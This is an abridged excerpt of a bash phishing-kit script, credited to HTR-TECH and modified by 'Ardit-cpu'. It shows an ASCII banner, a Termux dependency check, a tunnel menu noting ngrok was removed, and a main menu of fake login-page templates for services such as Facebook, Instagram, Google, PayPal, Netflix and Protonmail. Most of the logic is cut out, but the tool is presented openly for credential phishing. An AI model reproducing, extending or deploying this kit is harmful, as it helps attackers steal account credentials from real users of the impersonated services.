##ORIGIGNAL CODE IS BY HTR-TECH CODE MORE FEAUTRES AND UPDATES
##BY ARDIT BERISHA NGROK.IO REMOVED
...
banner() {
	cat <<- EOF
		...
		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|    V.1.2 wthout ngrok 
		${ORANGE}      | |                                
		${ORANGE}      |_|                ${RED}Version : 1.2 NGROK.IO REMOVED

		${GREEN}[${WHITE}-${GREEN}]${CYAN} tool Updated By Ardit-cpu (arditny_)${WHITE}
	EOF
}
...
dependencies() {
    ...
    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
			...
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} WAIT TO INSTALL THE PACKAGES : ${ORANGE}proot${CYAN}"${WHITE}
...
tunnel_menu() {
	...
	cat <<- EOF
		...
		${RED}[${RED}X${RED}]${RED}      NGROK.IO REMOVED ${RED}[${RED} NOT WORKING! ${RED}]
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}1${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}2${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}3${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}4${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}5${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}6${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}7${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
		${RED}[${WHITE}8${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}9${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
